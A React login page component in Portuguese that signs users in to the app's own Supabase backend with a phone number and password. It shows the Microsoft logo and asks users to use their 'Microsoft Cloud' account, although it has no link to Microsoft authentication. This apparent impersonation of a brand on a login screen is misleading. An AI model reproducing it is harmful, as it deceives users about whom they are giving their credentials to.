import React, { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { Eye, EyeOff, ShieldCheck, Phone, Key } from 'lucide-react';
import { motion } from 'motion/react';
import { useToast } from '../components/Toast';
import { Button } from '../components/Button';
import { useLanguage } from '../contexts/LanguageContext';
import { LanguageSelector } from '../components/LanguageSelector';
import { supabase } from '../lib/supabase';

export default function Login() {
  const navigate = useNavigate();
  const { showToast } = useToast();
  const { t } = useLanguage();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  
  const [formData, setFormData] = useState({
    phone: '',
    password: '',
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    // Sanitização: Apenas números para telefone, remove espaços para senha
    const sanitized = name === 'phone' 
      ? value.replace(/\D/g, '').slice(0, 9) 
      : value.trim();
    setFormData(prev => ({ ...prev, [name]: sanitized }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!formData.phone || formData.phone.length !== 9) {
      showToast('O telefone deve ter exatamente 9 dígitos.', 'error');
      return;
    }

    if (!formData.password) {
      showToast('Introduza a sua palavra-passe.', 'error');
      return;
    }

    setIsSubmitting(true);
    
    try {
      const { error } = await supabase.auth.signInWithPassword({
        email: `${formData.phone}@user.com`,
        password: formData.password,
      });

      if (error) throw error;
      // O redirecionamento será feito automaticamente pelo AuthContext.tsx via SIGNED_IN
    } catch (err: any) {
      showToast('Telefone ou senha incorretos.', 'error');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-white md:bg-[#f2f2f2] flex items-center justify-center p-4">
      <div className="absolute top-4 right-4 z-[100]">
        <LanguageSelector />
      </div>

      <motion.div 
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        className="w-full max-w-[440px] bg-white p-8 md:p-12 md:shadow-2xl border-0 md:border border-gray-100"
      >
        <div className="mb-10 text-left">
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" 
            alt="Microsoft" 
            className="h-6 mb-10"
          />
          <h1 className="text-2xl font-semibold tracking-tight">Entrar</h1>
          <p className="text-sm text-gray-500 mt-2">Use sua conta Microsoft Cloud para continuar.</p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="space-y-4">
            <div>
              <label className="block text-[10px] font-bold text-gray-400 uppercase tracking-widest mb-1">Telefone</label>
              <div className="relative">
                <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 font-bold text-xs">+244</span>
                <input
                  name="phone"
                  type="tel"
                  placeholder="900 000 000"
                  className="input-field pl-14"
                  value={formData.phone}
                  onChange={handleChange}
                />
                <Phone className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-300" size={16} />
              </div>
            </div>

            <div>
              <label className="block text-[10px] font-bold text-gray-400 uppercase tracking-widest mb-1">Palavra-passe</label>
              <div className="relative">
                <input
                  name="password"
                  type={showPassword ? "text" : "password"}
                  placeholder="Introduza sua senha"
                  className="input-field pr-10"
                  value={formData.password}
                  onChange={handleChange}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400"
                >
                  {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                </button>
              </div>
            </div>
          </div>

          <div className="pt-4 space-y-4">
            <Button type="submit" className="w-full h-[45px]" isLoading={isSubmitting}>
              Entrar
            </Button>
            
            <div className="flex items-center justify-center space-x-2 text-[10px] text-gray-400 font-bold uppercase tracking-widest">
              <ShieldCheck size={14} className="text-ms-blue" />
              <span>Acesso Seguro SSL</span>
            </div>

            <div className="text-center pt-4 border-t border-gray-100">
              <p className="text-sm text-gray-600">
                Não tem uma conta? <Link to="/cadastro" className="text-ms-blue font-bold hover:underline">Criar uma</Link>
              </p>
            </div>
          </div>
        </form>
      </motion.div>
    </div>
  );
}
